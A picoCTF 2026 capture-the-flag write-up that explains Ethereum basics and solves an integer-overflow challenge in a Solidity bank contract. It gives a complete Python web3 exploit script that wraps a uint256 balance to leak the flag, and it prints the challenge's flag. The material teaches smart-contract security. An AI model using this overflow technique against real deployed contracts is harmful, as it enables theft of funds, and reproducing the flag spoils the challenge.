---
title: 'Smart_Overflow: An interesting intro to a whole new class of problems'
description: 'A simple integer overflow exploit, but on the Blockchain!'
date: 2026-07-07
event: 'picoCTF 2026 (Library #760)'
category: 'blockchain'
difficulty: 'easy'
points: 300
tags: ['pwn', 'blockchain']
problem: |
  Welcome!

  The contract tracks balances using uint256 math. It should be impossible to get the flag...
   Contract: [here](https://challenge-files.picoctf.net/c_mysterious_sea/0b3648cc8890630501d569e77aeb552476ab282cc17421ebb7d33fc205f4c3f6/IntOverflowBank.sol)

problemUrl: 'https://learn.cylabacademy.org/library/760'
hints:
  - 'What happens when balances[msg.sender] becomes smaller after a deposit?'
  - "Look at the flag reveal condition carefully."
  - 'Why do attackers like integers?'
flag: 'picoCTF{Sm4r7_OverFL0ws_ExI5t_48f817eb}'
draft: false
---

# Recon

This is an interesting problem because it introduces a totally new category of problems which don't seem to be very common in CTFs, 'Blockchain'. 
For someone who isn't used to working with blockchain development, the real challenge isn't finding the vulnerability and exploit but rather understanding what is even going on. 
There's too many questions one asks, like "What even is a _smart contract_ in the first place?" or "There are so many _addresses_ over here, what do they even mean?" or "What is this _Eth node_ address and port I've been given, do I SSH to it or use netcat?" or "What's _Gas_?". 
I had the same questions and went down a rabbit hole trying to find good enough answers to convince me and get a working mental model.
It's kinda hard to find great information and examples about this online, because you need to navigate through a lot of unnecessary information and a surprising amount of crypto investment pitches :P

_Disclaimer: Even I'm still learning here and trying to figure the whole picture, so corrections and improvements are always welcome. You can reach out to me on my [Telegram](https://t.me/Kaddy12)._

### High Level Picture

For now, think of the Ethereum node as a simple web server, the kind we interact with whenever we browse the web, the same kind you are interacting with when you open this webpage. 
What happened when you landed on this page? The web server at GitHub ran a piece of code which sent your browser an HTML/CSS/JS bundle and the browser rendered it to show you what you are seeing. 
Now let's take it up a notch. This is a **static webpage**, which means that everything you do just stays in your browser. You could download the whole website and turn off your internet connection and everything would still work. But that is not how all webpages are, most modern ones are **dynamic** which means they have a server which responds to API requests, interacts with a database to display elements on the webpage. It could run some proprietary code on the server and return some results, some code which can't be handed over to the user in the JavaScript code which the user's browser receives. 
So in this interaction, you have a server which hosts some code and the client (your browser) interacts with it in some way. Capiche?

Now, let's say your website has code which you want it to run only if the user identifies themselves first or **authenticates** themselves first. 
As an example, think of your personal social media account page or your internet banking webpage. You need to identify that you are indeed the person this page was meant for and the mechanism for doing so is generally passwords/OTPs/2FAs. 

The last moving part here applies to websites where you need to 'pay' to get the website to run some code you want. The best example of this would be **AI Model Subscriptions**, where when you buy tokens or a premium version, you are essentially providing an AI company money to run a particular code when you request for it. Or alternatively, buying premium subscriptions!

So servers, clients, interaction and authentication the way we generally understand are essential components of the web we use, called the Web 2.0 and they translate neatly to Web 3.0!

### Here is the analogous mapping
| Web 2.0 keyword | Web 3.0 buzzword | Purpose |
| --------------- | ---------------- | ------- |
| HTTPS | Ethereum | Protocol for enabling communication |
| Server | Eth Node | Place where the code is run |
| Server IP Address/URL | Node Address | The location of the server |
| Serverside Backend Code | Smart Contract | The actual instructions to run |
| API Endpoint | Contract Address (called Bank Address here) | Specifying the particular piece of code you want run |
| Client | Eth Client (can be the same as server in P2P like Ethereum) | The user's window to interacting with the server |
| World Wide Web | Blockchain | The way for the client to reach the server |
| Interaction/API Call | Transaction | A unit of interaction between client and server |
| Passwords/2FA/OTPs | Private Keys | Authentication Mechanism |
| Credits/Tokens | Gas | Incentive for the server to run the code you want |

### Interacting as a Client
There are several ways to interact as a client. Using _Metamask_ seems to be a popular way online. But it requires signing up and some complicated setup, so we will write our own client from scratch using the [Python web3 library](https://web3py.readthedocs.io/en/stable/). ~~The documentation is not that great in my opinion because it doesn't have type information or even satisfactorily explain what each function is doing and frankly, it's like navigating a mess.~~

### A deeper picture
This model isn't necessary to solve this challenge but it helps to understand how Web 3.0 works. Ethereum is the name of both the currency and the underlying protocol used here. A blockchain traditionally was just a **distributed** (no one owns or controls it, it's like common knowledge which more than 50% of the users agree on) **ledger** (a reliable record from the time it started) of **transactions** (a message which records a payment of an amount from one user to another). 
Ethereum takes this one step further by widening the definition of a transaction. On the Ethereum ledger, you can put not only monetary transfers but also deploy 'smart contracts' which are enforceable by the underlying consensus mechanism. 
To understand a 'contract', think of it like something changes a software state based on some action or condition. The code for a contract and the state it modifies is open to anyone who wishes to see the blockchain or the ledger. The code is executed on the Ethereum Virtual Machine, which is a virtual state machine that anyone who wishes to verify (or mine) a transaction can run.

Let's say I am a musician and I deploy a smart contract on the Ethereum blockchain which allows you to download a copy of my song if you pay me a certain amount. The smart contract ensures that the download operation can be permitted only when the money has changed hands (or addresses in this case). In Ethereum lingo, everything you do on the blockchain is a transaction, like sending the money, recording the sale or downloading the song. 
Or in our case, any function called is a transaction. 

Now coming to gas, it is literally the cost you pay for running your code on the EVM. When you deploy a smart contract, you need to pay gas (a type of fee) for the computation it took to add this code to the EVM. When someone calls a function in your smart contract, they pay gas for the computational power expended: more complicated or longer running computations require more gas. The fee you pay is split into two parts: a **base fee**, which is 'burned' or goes out of circulation, like literally burning up a currency note, and a **priority fee** (or 'tip'), which goes to the ones who painfully ensure the consistency and reliability of the blockchain by validating all transactions. Gas is also a protocol-level safeguard/incentive mechanism to ensure that no one can hang the validators' EVMs by expensive or malicious calculations (like just calling a smart contract with a parameter that leads to an infinite loop). 

Phew, that was the Ethereum and Smart Contracts 101 and we can finally have a look at the problem now! We'll learn more as we read the code. 

# The vulnerability

Honestly, if the same code given here was written in C, it would be an Easy problem because of how obvious the vulnerability is. 
```solidity
pragma solidity ^0.6.12;

contract IntOverflowBank {
    mapping(address => uint256) public balances;
    address public owner;
    string private flag;
    bool public revealed;

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);
    event FlagRevealed(string flag);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    constructor() public {
        owner = msg.sender;
        revealed = false;
    }

    function setFlag(string memory _flag) external onlyOwner {
        flag = _flag;
    }

    function deposit(uint256 amount) external {
        uint256 oldBalance = balances[msg.sender];
        balances[msg.sender] = balances[msg.sender] + amount;

        emit Deposit(msg.sender, amount);
        if (!revealed && balances[msg.sender] < amount) {
            revealed = true;
            emit FlagRevealed(flag);
        }
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender] - amount;
        emit Withdraw(msg.sender, amount);
    }

    function getFlag() external view returns (string memory) {
        require(revealed, "Flag not revealed yet");
        return flag;
    }
}
```
Most variables and functions are obvious. The flag is revealed when depositing a positive amount to the sender's account results in a balance lower than the pre-deposit balance. This happens when there is an integer overflow and the balance wraps around to 0 (as the data type for balances is unsigned 256 bit integer).

# The exploit

To exploit this vulnerability, we just need to find the current balance and send transactions such that there is an overflow in some transaction such that the balance wraps around to 0 and the flag is revealed. 

# The exploit code

Here is the entire code for the exploit. We will go over it piece by piece in the next section, so feel free to skip past this dump for now.

<details class="code-dump">
<summary>Show the entire exploit script</summary>

```py
from web3 import Web3
from web3.middleware import SignAndSendRawMiddlewareBuilder
from eth_account import Account
from solcx import install_solc
from solcx import compile_source
import requests
from bs4 import BeautifulSoup

http_port = int(input("Enter the port to connect to for the details: "))
eth_node_port = int(input("Enter the port for the Ethereum node: "))

res = requests.get(f'http://mysterious-sea.picoctf.net:{http_port}/')
assert res.status_code == 200, f"Expected successful HTTP response, got response code {res.status_code}"

soup = BeautifulSoup(res.content, 'html.parser')
BANK_ADDRESS = soup.find(id='contract-address').get_text()
PRIVATE_KEY = soup.find(id='player-priv').get_text()
PLAYER_ADDRESS = soup.find(id='player-address').get_text()
NODE_ADDR = f"mysterious-sea.picoctf.net:{eth_node_port}"

# Initialize a Web3 object
w3 = Web3(Web3.HTTPProvider(f"http://{NODE_ADDR}"))

assert w3.is_connected(), "Unable to connect to the Ethereum node"

# Initialize the account
account = Account.from_key(PRIVATE_KEY)
assert account.address == PLAYER_ADDRESS, "Player address does not match private key"
w3.middleware_onion.inject(SignAndSendRawMiddlewareBuilder.build(account), layer=0)
w3.eth.default_account = account.address

# Get the ABI
with open("IntOverflowBank.sol") as f:
    src_code = f.read()
    install_solc(version="0.6.12")
    compiled_sol = compile_source(src_code, solc_version="0.6.12", output_values=["abi"])

contract_id, contract = compiled_sol.popitem()
abi = contract["abi"]

# Call the functions
print("Current account balance: ", w3.eth.get_balance(account.address))
bank_contract = w3.eth.contract(address=BANK_ADDRESS, abi=abi)

print(f"Owner Address: {bank_contract.functions.owner.call()}")
print(f"Current flag state: {bank_contract.functions.revealed.call()}")
print(f"Current account balance: {bank_contract.functions.balances(account.address).call()}")

current_balance = bank_contract.functions.balances(account.address).call()
max_balance = 2**256 - 1

# To cause the overflow, let us send two transactions such that the 2nd one causes overflow
total_deposit_required = max_balance - current_balance + 1
deposit_amt_1 = total_deposit_required // 2
deposit_amt_2 = total_deposit_required - deposit_amt_1

print("Sending first deposit transaction")
txn_hash_1 = bank_contract.functions.deposit(deposit_amt_1).transact()
txn_receipt_1 = w3.eth.wait_for_transaction_receipt(txn_hash_1)
print(f"Gas used: {txn_receipt_1.gasUsed}")
print(f"Current flag state: {bank_contract.functions.revealed.call()}")
print(f"Current account balance: {bank_contract.functions.balances(account.address).call()}")

print("Sending second deposit transaction")
txn_hash_2 = bank_contract.functions.deposit(deposit_amt_2).transact()
txn_receipt_2 = w3.eth.wait_for_transaction_receipt(txn_hash_2)
print(f"Gas used: {txn_receipt_2.gasUsed}")
print(f"Current flag state: {bank_contract.functions.revealed.call()}")
print(f"Current account balance: {bank_contract.functions.balances(account.address).call()}")
```

</details>

### Imports
```py
from web3 import Web3
from web3.middleware import SignAndSendRawMiddlewareBuilder
from eth_account import Account
from solcx import install_solc
from solcx import compile_source
import requests
from bs4 import BeautifulSoup
```
Most of the heavy lifting is done by [`web3`](https://web3py.readthedocs.io/en/stable/) (web3.py), which is how we talk to the Ethereum node. `SignAndSendRawMiddlewareBuilder` and `eth_account.Account` come along for the ride, and we'll use them to sign our transactions locally with our private key. `solcx` (the `py-solc-x` package) is a thin Python wrapper around the actual Solidity compiler `solc`; we need it to compile the contract source and pull out its ABI (more on that later). Finally, `requests` and `bs4` (`beautifulsoup4`) are for the little scraper that grabs our connection details off the challenge page.

You can install everything with:
```sh
pip install web3 py-solc-x requests beautifulsoup4
```
(`eth_account` ships as a dependency of `web3`, so you don't need to install it separately.)

### User input
```py
http_port = int(input("Enter the port to connect to for the details: "))
eth_node_port = int(input("Enter the port for the Ethereum node: "))
```
The first input is the port at which we connect to the HTTP server which provides necessary details such as the contract address. You can find this at the end of the URL which shows up when you spin up an instance. 

The second input is the port at which we can connect to the Ethereum Node which runs the Ethereum virtual machine. This is the node's JSON-RPC endpoint, the HTTP interface web3.py uses to actually talk to the node. Every query we make (reading a balance, checking `revealed`) and every transaction we send (our deposits) is an RPC call fired at this port, which the node then executes against the EVM.

### Scraper
```py
res = requests.get(f'http://mysterious-sea.picoctf.net:{http_port}/')
assert res.status_code == 200, f"Expected successful HTTP response, got response code {res.status_code}"

soup = BeautifulSoup(res.content, 'html.parser')
BANK_ADDRESS = soup.find(id='contract-address').get_text()
PRIVATE_KEY = soup.find(id='player-priv').get_text()
PLAYER_ADDRESS = soup.find(id='player-address').get_text()
NODE_ADDR = f"mysterious-sea.picoctf.net:{eth_node_port}"
```
The next section is simple, we just use `requests` and `BeautifulSoup4` to parse the webpage which we just visited and get the necessary details. In particular, I made this scraper instead of just copy-pasting because it was annoying to do so again and again and also because the Copy buttons on the webpage didn't work for me :\( 

### Initializations
```py
# Initialize a Web3 object
w3 = Web3(Web3.HTTPProvider(f"http://{NODE_ADDR}"))

assert w3.is_connected(), "Unable to connect to the Ethereum node"

# Initialize the account
account = Account.from_key(PRIVATE_KEY)
assert account.address == PLAYER_ADDRESS, "Player address does not match private key"
w3.middleware_onion.inject(SignAndSendRawMiddlewareBuilder.build(account), layer=0)
w3.eth.default_account = account.address
```
First we build the `Web3` object pointed at the node's RPC URL, and `assert w3.is_connected()` just fails fast if we typo'd the port or the node is down.

Next we turn the private key we scraped into an `account` object with `Account.from_key`. The `assert account.address == PLAYER_ADDRESS` is a sanity check: the address derived from the private key should match the player address the challenge handed us, and if it doesn't, we scraped something wrong.

The interesting line is `middleware_onion.inject(...)`. We're talking to a *remote* node that doesn't hold our private key, so it can't sign transactions for us. This middleware hooks into web3's request pipeline (the "onion" is its layered stack of middlewares, and `layer=0` slots ours at the outermost layer) so that whenever we call `.transact()`, it automatically signs the transaction locally with our key and sends it as a raw, pre-signed transaction. Setting `w3.eth.default_account` then means we don't have to specify the `from` address on every call.

The reason this matters is that without it, every single transaction turns into a lengthy, repetitive build-sign-send dance that you have to spell out by hand. Instead of just:
```py
txn_hash = bank_contract.functions.deposit(deposit_amt_1).transact()
```
you'd have to write something like this for *each* call:
```py
txn = bank_contract.functions.deposit(deposit_amt_1).build_transaction({
    "from": account.address,
    "nonce": w3.eth.get_transaction_count(account.address),
    "gas": 200000,
    "gasPrice": w3.eth.gas_price,
    "chainId": w3.eth.chain_id,
})
signed = account.sign_transaction(txn)
txn_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
```
manually fetching the nonce, estimating gas, signing, and sending the raw bytes every time. The middleware collapses all of that back into a single `.transact()`.

### Getting the ABI
```py
# Get the ABI
with open("IntOverflowBank.sol") as f:
    src_code = f.read()
    install_solc(version="0.6.12")
    compiled_sol = compile_source(src_code, solc_version="0.6.12", output_values=["abi"])

contract_id, contract = compiled_sol.popitem()
abi = contract["abi"]
```
An **ABI** (Application Binary Interface) is basically the contract's schema: a JSON description of every function, its arguments, return types, and events. The EVM only speaks raw bytes, so web3.py needs the ABI to know how to encode our function calls into calldata and decode whatever comes back. Without it, web3 has no idea that a `deposit(uint256)` or `balances(address)` function even exists.

We don't get the ABI for free, so we have to compile the contract source ourselves. We grab `IntOverflowBank.sol` (the file linked in the problem), `install_solc("0.6.12")` fetches the exact compiler version matching the contract's `pragma solidity ^0.6.12`, and `compile_source(..., output_values=["abi"])` compiles it and hands back just the ABI. `popitem()` pulls out the single compiled contract, and we read its `["abi"]`.

### Actual exploit
```py
# Call the functions
print("Current account balance: ", w3.eth.get_balance(account.address))
bank_contract = w3.eth.contract(address=BANK_ADDRESS, abi=abi)

print(f"Owner Address: {bank_contract.functions.owner.call()}")
print(f"Current flag state: {bank_contract.functions.revealed.call()}")
print(f"Current account balance: {bank_contract.functions.balances(account.address).call()}")

current_balance = bank_contract.functions.balances(account.address).call()
max_balance = 2**256 - 1

# To cause the overflow, let us send two transactions such that the 2nd one causes overflow
total_deposit_required = max_balance - current_balance + 1
deposit_amt_1 = total_deposit_required // 2
deposit_amt_2 = total_deposit_required - deposit_amt_1

print("Sending first deposit transaction")
txn_hash_1 = bank_contract.functions.deposit(deposit_amt_1).transact()
txn_receipt_1 = w3.eth.wait_for_transaction_receipt(txn_hash_1)
print(f"Gas used: {txn_receipt_1.gasUsed}")
print(f"Current flag state: {bank_contract.functions.revealed.call()}")
print(f"Current account balance: {bank_contract.functions.balances(account.address).call()}")

print("Sending second deposit transaction")
txn_hash_2 = bank_contract.functions.deposit(deposit_amt_2).transact()
txn_receipt_2 = w3.eth.wait_for_transaction_receipt(txn_hash_2)
print(f"Gas used: {txn_receipt_2.gasUsed}")
print(f"Current flag state: {bank_contract.functions.revealed.call()}")
print(f"Current account balance: {bank_contract.functions.balances(account.address).call()}")
```
The math is the whole exploit. `balances` is a `uint256`, so it maxes out at `2**256 - 1`. To wrap it back around to 0 we need to deposit `max_balance - current_balance + 1` in total. Depositing that in one shot would work fine, but I split it across **two** transactions on purpose: after the first deposit the balance is still huge (no overflow yet), and only the second one tips it over and triggers the `FlagRevealed` event. Printing the state after each call makes it easy to actually *see* the overflow happen instead of just trusting the math.

One thing that tripped me up: notice we call `bank_contract.functions.owner`, `.revealed`, and `.balances(...)` even though the contract never explicitly defines getter functions for them. That's a Solidity quirk. Declaring a state variable `public` (like `address public owner` or `mapping(address => uint256) public balances`) makes the compiler auto-generate a getter with the same name. For a mapping, that getter takes the key as an argument, which is why `balances` is called with our address. Our `flag` variable is `private`, so it gets no such getter, which is exactly why we need the whole overflow song and dance to leak it. It's honestly a bit of a shame that the web3.py documentation doesn't mention this auto-getter behaviour anywhere; it took some digging to work out where these functions were even coming from.

# But wait…

So okay, we just transacted with a smart contract deployed on the Ethereum blockchain. So does this mean that these `deposit` calls we just made are present on the blockchain for millions of people to see? And who paid for the gas, it didn't come out of our pocket and PicoCTF isn't really generous enough to sponsor our Ethereum experiments :)

This is a question I spent too much time thinking about and researching without finding a satisfactory answer anywhere and if you have the same doubt, here's the answer!

The short version: no, none of this touches the "real" Ethereum blockchain that millions of people watch, and nobody paid any real money for the gas.

When you spin up the challenge instance, picoCTF doesn't point you at Ethereum mainnet. It boots a fresh, private, throwaway Ethereum network just for your instance, usually with a local development node like Anvil (Foundry), Ganache, or Hardhat, or a `geth` node running in `--dev` mode. This is its own isolated chain with its own genesis block, its own ledger, and a grand total of one participant: you. The `deposit` transactions you sent really are recorded on that private chain's ledger, but that ledger lives and dies with your instance. The moment the instance is torn down, the whole chain (your transactions included) is thrown away. So no, they aren't sitting on the public blockchain for the world to see.

That also answers the gas question. The account whose private key you scraped off the challenge page was pre-funded with a big pile of ETH on this private chain, which is exactly why that first `w3.eth.get_balance(...)` printed such a huge number. But that ETH is fake: it's test ETH the dev node minted out of thin air at startup, and it has precisely zero value anywhere outside this sandbox. Many of these dev setups even set the gas price to 0, so transactions effectively cost nothing. Either way, "who paid" is you, out of the worthless play money the challenge handed you. picoCTF never had to spend a cent of real ETH; it just spun up a disposable little universe where you happen to be rich and gas is free.

This is also why nothing you did here (inflating balances, overflowing the counter, leaking the flag) has any consequence beyond the challenge. You were playing in a completely sealed sandbox that resets the moment you disconnect.

# Takeaways

I dunno, I learnt that Blockchain Development could be a fun role for me, what did you take away from this? XD



The captured flag is in the spoiler below.

